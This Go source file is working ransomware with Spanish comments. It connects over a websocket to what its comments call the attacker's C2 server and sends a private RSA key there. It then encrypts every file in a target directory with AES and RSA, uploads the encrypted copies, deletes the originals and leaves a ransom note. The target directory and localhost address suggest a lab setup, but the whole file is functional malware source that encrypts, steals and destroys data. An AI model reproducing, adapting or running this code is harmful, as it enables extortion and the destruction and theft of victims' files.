package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"time"

	"github.com/golang-jwt/jwt"
	"github.com/gorilla/websocket"
)

// Configuración
var mySigningKey = []byte("secret")
var serverURL = "ws://localhost:8080/ws" // Dirección del servidor atacante
var sourceDir = "/tmp/dummy"             // Directorio a atacar
var privateKeyFile = "private.key"
var publicKeyFile = "public.key"

// Estructura de datos a enviar
type TokenPayload struct {
	Token string `json:"token"`
	Data  []byte `json:"data"`
	Name  string `json:"name"`
}

// Generar Token JWT para autenticarse con el servidor
func GenerateToken() (string, error) {
	claims := jwt.MapClaims{
		"authorized": true,
		"exp":        time.Now().Add(time.Minute * 5).Unix(),
	}
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	return token.SignedString(mySigningKey)
}

// Función para cifrar AES
func encryptAES(data, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil { return nil, err }
	aesGCM, err := cipher.NewGCM(block)
	if err != nil { return nil, err }
	nonce := make([]byte, aesGCM.NonceSize())
	if _, err := rand.Read(nonce); err != nil { return nil, err }
	return aesGCM.Seal(nonce, nonce, data, nil), nil
}

func main() {
	// 1. Cargar claves
	publicKeyBytes, err := ioutil.ReadFile(publicKeyFile)
	if err != nil { log.Fatal("Error leyendo public.key:", err) }
	
	block, _ := pem.Decode(publicKeyBytes)
	parsedKey, err := x509.ParsePKIXPublicKey(block.Bytes)
	publicKey := parsedKey.(*rsa.PublicKey)

	privateKeyBytes, err := ioutil.ReadFile(privateKeyFile)
	if err != nil { log.Fatal("Error leyendo private.key:", err) }

	// 2. Conectar al servidor atacante
	token, _ := GenerateToken()
	header := http.Header{}

	conn, _, err := websocket.DefaultDialer.Dial(serverURL, header)
	if err != nil {
		log.Fatal("Error conectando al servidor C2 (¿Está encendido?):", err)
	}
	defer conn.Close()
	fmt.Println("Conexión establecida con el servidor atacante.")

	// 3. EXFILTRAR LA CLAVE PRIVADA
	payload := TokenPayload{
		Token: token,
		Data:  privateKeyBytes,
		Name:  "private.key",
	}
	if err := conn.WriteJSON(payload); err != nil {
		log.Println("Error enviando clave privada:", err)
	} else {
		fmt.Println(">> Clave privada exfiltrada con éxito.")
	}

	// 4. Recorrer archivos, cifrar y exfiltrar
	filepath.Walk(sourceDir, func(path string, info os.FileInfo, err error) error {
		// --- CORRECCIÓN: Evitar el crash si hay error de lectura ---
		if err != nil {
			return nil
		}
		// ----------------------------------------------------------

		if !info.IsDir() && filepath.Ext(path) != ".crypted" && info.Name() != "ATTENTION.txt" {
			// Leer archivo original
			data, _ := ioutil.ReadFile(path)

			// Cifrar (AES + RSA)
			aesKey := make([]byte, 32)
			rand.Read(aesKey)
			encryptedData, _ := encryptAES(data, aesKey)
			encryptedKey, _ := rsa.EncryptOAEP(sha256.New(), rand.Reader, publicKey, aesKey, nil)
			finalData := append(encryptedKey, encryptedData...)

			// Guardar .crypted
			newPath := path + ".crypted"
			ioutil.WriteFile(newPath, finalData, 0644)

			// EXFILTRAR el archivo cifrado al servidor
			cryptedPayload := TokenPayload{
				Token: token,
				Data:  finalData,
				Name:  filepath.Base(newPath),
			}
			if err := conn.WriteJSON(cryptedPayload); err == nil {
				fmt.Println("Exfiltrado:", newPath)
			}

			// Borrar original
			os.Remove(path)
		}
		return nil
	})

	// Dejar nota de rescate
	attentionFile := filepath.Join(sourceDir, "ATTENTION.txt")
	ioutil.WriteFile(attentionFile, []byte("FILES ENCRYPTED. WE HAVE YOUR DATA."), 0644)
	
	fmt.Println("Ataque finalizado. Datos robados y archivos cifrados.")
}
